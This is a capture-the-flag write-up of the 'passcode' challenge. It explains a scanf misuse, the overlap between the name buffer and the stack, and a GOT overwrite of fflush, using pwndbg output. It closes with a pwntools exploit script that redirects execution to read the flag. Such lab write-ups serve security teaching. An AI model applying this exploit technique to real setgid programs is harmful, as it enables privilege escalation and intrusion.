---
custom_edit_url: null
sidebar_position: 4
---

> Mommy told me to make a passcode based login system.\
> My first trial C implementation compiled without any error!\
> Well, there were some compiler warnings, but who cares about that?

## File properties

```
passcode@ubuntu:~$ file ./passcode
./passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e24d23d6babbfa731aaae3d50c6bb1c37dc9b0af, for GNU/Linux 3.2.0, not stripped
```

## Source code

```c title="passcode.c" showLineNumbers
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
        scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==123456 && passcode2==13371337){
        printf("Login OK!\n");
        setregid(getegid(), getegid());
        system("/bin/cat flag");
    }
    else{
        printf("Login Failed!\n");
        exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.1 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

The chellenge has two functions:

- `welcome()`:
    - Sets a buffer `name` which is 100 bytes long.
    - Reads 100 bytes of user input into the buffer.
- `login()`:
    - Initializes two variables `passcode1` and `passcode2` but does not assign them any value.
    - Uses `scanf()` to read user input digits into the address pointed to by the value of `passcode1` and `passcode2`.
 
### [`scanf()`](https://man7.org/linux/man-pages/man3/scanf.3.html)

The implementation of `scanf()` in the challenge is incorrect.

#### Incorrect usage

In this case, it is treating the value inside of `passcode1` as a memory address and storing user input at that address.

```text title="Incorrect usage"
int passcode1, passcode2;
scanf("%d", passcode1);  

┌─────────────────────┐ 
│     0xdeadbeef      │  ← passcode2 at 0xffffd1ac (garbage)
├─────────────────────┤
│     0xcafebabe      │  ← passcode1 at 0xffffd1b0 (garbage)
└─────────────────────┘

// scanf() tries to write to 0xcafebabe, which is the garbage value in passcode1
```

#### Correct usage

Ideally, user input should be stored at the address which points to `passcode1`, 

```text title="Correct usage"
int passcode1, passcode2;
scanf("%d", &passcode1); 

┌─────────────────────┐  
│     0xdeadbeef      │  ← passcode2 at 0xffffd1ac (garbage)
├─────────────────────┤
│     0xcafebabe      │  ← passcode1 at 0xffffd1b0 (garbage)
└─────────────────────┘

// scanf() writes to 0xffffd1b0, which is the valid address of passcode1
```

Note at this applies for `passcode2` as well.

## Disassembly

We can even see the difference in the disassembled code.

```
pwndbg> disassemble welcome
Dump of assembler code for function welcome:

# --- snip ---

   0x08049324 <+50>:	lea    eax,[ebp-0x70]
   0x08049327 <+53>:	push   eax
   0x08049328 <+54>:	lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:	push   eax
   0x0804932f <+61>:	call   0x80490d0 <__isoc99_scanf@plt>

# --- snip ----

End of assembler dump
```

In `welcome()`, which has the correct usage of `scanf()`, the address `ebp-0x70` is pushed as the first argument. This allows `scanf()` to correctly write the input into that memory.

```
pwndbg> disassemble login
Dump of assembler code for function login:

# --- snip ---

   0x0804921e <+40>:	push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:	lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:	push   eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>

# --- snip ----

   0x08049259 <+99>:	push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:	lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:	push   eax
   0x08049263 <+109>:	call   0x80490d0 <__isoc99_scanf@plt>

# --- snip ---

End of assembler dump
```

In `login()`, which has the incorrect usage of `scanf()`, the first argument is the value at address `ebp-0x10` for `passcode1` and the value address `ebp-0xc` for `passcode2` respectively, instead of their adresses.

This results in `scanf()` treating those integer values as pointers and trying to write user input to those potentially invalid addresses, which can cause a segmentation fault or undefined behavior.

There is also something else we can observe in the disassembled code.

The `name` buffer which is 100 bytes long, is initialized at address `ebp-0x70`, while `passcode1` is stored at `ebp-0x10`.
This means that the program is reusing th stack and that the last 4 bytes of `name` overlap with `passcode`.

## Stack

```
<==: Value is stored at the address
<--: Points to the address

                       ╎  .. .. .. ..  ╎
                       ┌───────────────┐   
                  *==> │  61 61 61 61  │
                 ╱     │  62 61 61 61  │
                ╱      │  63 61 61 61  │
               *       │  64 61 61 61  │
               ║       │  65 61 61 61  │
               ║       │  66 61 61 61  │
               ║       │  67 61 61 61  │
               ║       │  68 61 61 61  │
               ║       │  69 61 61 61  │
               ║       │  6A 61 61 61  │
               ║       │  6B 61 61 61  │
               ║       │  6C 61 61 61  │ 
        name ==║       │  6D 61 61 61  │
               ║       │  6E 61 61 61  │
               ║       │  6F 61 61 61  │
               ║       │  70 61 61 61  │
               ║       │  71 61 61 61  │
               ║       │  72 61 61 61  │
               ║       │  73 61 61 61  │
               ║       │  74 61 61 61  │
               ║       │  75 61 61 61  │
               ║       │  76 61 61 61  │
               *       │  77 61 61 61  │
                ╲      │  78 61 61 61  │
                 ╲     ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  *==> │  79 61 61 61  │ <== passcode1
                       ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                       │  00 00 00 00  │
                       │  00 00 00 00  │
                       │  00 00 00 00  │
                       ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
               ebp --> │  6C 61 61 61  │ 
                       └───────────────┘
                       ╎  .. .. .. ..  ╎
```

Let's verify.

```
pwndbg> break login
Breakpoint 1 at 0x80491fb
```

Let's create a cyclic pattern of length 100 bytes.

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

We can now run the challenge within GDB and pass the cyclic pattern as input.

```
pwndbg> run
Starting program: /home/passcode/passcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!

Breakpoint 1, 0x080491fb in login ()

# --- snip ---
```

Once our breakpoint within `login()` is hit, we can display the stack.

```
pwndbg> x/25wx $ebp-0x70
0xffd33f08:	0x61616161	0x61616162	0x61616163	0x61616164
0xffd33f18:	0x61616165	0x61616166	0x61616167	0x61616168
0xffd33f28:	0x61616169	0x6161616a	0x6161616b	0x6161616c
0xffd33f38:	0x6161616d	0x6161616e	0x6161616f	0x61616170
0xffd33f48:	0x61616171	0x61616172	0x61616173	0x61616174
0xffd33f58:	0x61616175	0x61616176	0x61616177	0x61616178
0xffd33f68:	0x61616179
```

The 25th word is `0x61616179` i.e. `yaaa` in ASCII.

Now, let's display the address of `passcode1` which is at `ebp-0x10`.

```
pwndbg> x/wx $ebp-0x10
0xffd33f68:	0x61616179
```

We can see that is the same word `yaaa`. This proves that we have overwritten the value of `passcode1`.
So, we can overwrite the location at which `scanf()` will read our input for the 1st passcode. This is because of the [incorrect usage](#incorrect-usage) of `scanf()`.

This opens up and exploit path for us.

If we look at the code, we can see that it calls `system()` in order to `cat` out the flag. Before that it sets both the real group ID and effective group ID to the current effective group ID.

```c title="passcode.c"
# --- snip ---

        setregid(getegid(), getegid());
        system("/bin/cat flag");

# --- snip ---
```

We need to somehow execute this code.

```
pwndbg> disassemble login
Dump of assembler code for function login:

# --- snip ---

   0x0804929e <+168>:	add    esp,0x10
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>

# --- snip ---

End of assembler dump.
```

We can see that the address of the `system("/bin/cat flag");` setup is `0x0804929e`. 
This is what we want to pass as input to `scanf()`.

But we still haven't decided where we want to read this address.

Looking at the challenge code, we can see that the `fflush()` call is made right after `scanf()`.

```c title="passcode.c"
# --- snip ---

    scanf("%d", passcode1);
    fflush(stdin);

# --- snip ---
```

It does not have any conditions either, which means it will be executed no matter what.

## GOT overwrite

> The Global Offset Table, or GOT, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly, independent of the memory address where the program's code or data is loaded at runtime.[1]\
>It maps symbols in programming code to their corresponding absolute memory addresses to facilitate Position Independent Code (PIC) and Position Independent Executables (PIE)[2] which are loaded[3] to a different memory address each time the program is started. The runtime memory address, also known as absolute memory address of variables and functions is unknown before the program is started when PIC or PIE code is run[4] so cannot be hardcoded during compilation by a compiler.
>
> — Wikipedia

In layman's terms, the GOT (Global Offset Table) is needed to help programs find and use functions and variables that are not defined in the program itself but are instead found in shared libraries (like libc.so on Linux).

The GOT is filled in at runtime, usually by the dynamic linker and stores the real memory addresses of these shared library functions.

```
Global Offset Table      
┌───────────────────────┐   
│        fflush         │   
│                       │─────┐
├───────────────────────┤     │ 
│        printf         │     │
│                       │     │
├───────────────────────┤     │
│          ...          │     │
│                       │     │
└───────────────────────┘     │
                              │
libc.so.6──────────────────┐  │
│  ┌───────┐               │  │
│  │fflush │ <────────────────┘       
│  └───────┘               │
│  ┌───────┐               │  
│  │printf │               │  
│  └───────┘               │
│                          │
│   ......                 │
│                          │
└──────────────────────────┘

Commands:
   0x0804929e <+168>:	add    esp,0x10
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
```

If we find the GOT address of `fflush()` and pass as the last 4 bytes in the `name` buffer, we can overwrite the GOT entry at the address of `fflush()` with the address of `system("/bin/cat flag");` setup.

This will cause the setup of `system("/bin/cat flag");` to be executed when the program calls `fflush()`

```
Global Offset Table      
┌───────────────────────┐   
│        fflush         │   
│                       │─────┐
├───────────────────────┤     │ 
│        printf         │     │
│                       │     │
├───────────────────────┤     │
│          ...          │     │
│                       │     │
└───────────────────────┘     │
                              │
libc.so.6──────────────────┐  │
│  ┌───────┐               │  │
│  │fflush │               │  │
│  └───────┘               │  │
│  ┌───────┐               │  │
│  │printf │               │  │
│  └───────┘               │  │
│                          │  │
│   ......                 │  │
│                          │  │
└──────────────────────────┘  │
                              │
           ┌──────────────────┘
           │
Commands:  v
   0x0804929e <+168>:	add    esp,0x10
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
```

Let's checkout the GOT for the challenge program.

```
passcode@ubuntu:~$ objdump -R ./passcode

# --- snip ---

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804bff8 R_386_GLOB_DAT    __gmon_start__@Base
0804bffc R_386_GLOB_DAT    stdin@GLIBC_2.0
0804c00c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34
0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804c018 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0
0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804c02c R_386_JUMP_SLOT   setregid@GLIBC_2.0
0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7

# --- snip ---
```

We can see that the address of `fflush()` is `0x0804c014`.
Importantly, it also does not have any terminating bytes (`0x00`, `0x0a`, `0x09`, etc). This means that our `scanf()` input will not be terminated abruptly.

## Exploit

We have all the requirements to craft a successfull exploit.
	- [x] Number padding bytes: `96`
	- [x] GOT address of `fflush()`: `0x0804c014`
 	- [x] Address of `system("/bin/cat flag");` setup: `0x0804929e`. We have to pass this as a decimal.

```python title="/tmp/passcode.py"
from pwn import *

padding = b"A" * 96
fflush_addr = p32(0x0804c014)
got_overwrite_payload = padding + fflush_addr

p = process("/home/passcode/passcode")
p.sendline(got_overwrite_payload)

system_addr = str(0x0804929e)

p.sendline(system_addr)
print(p.recvall())
```

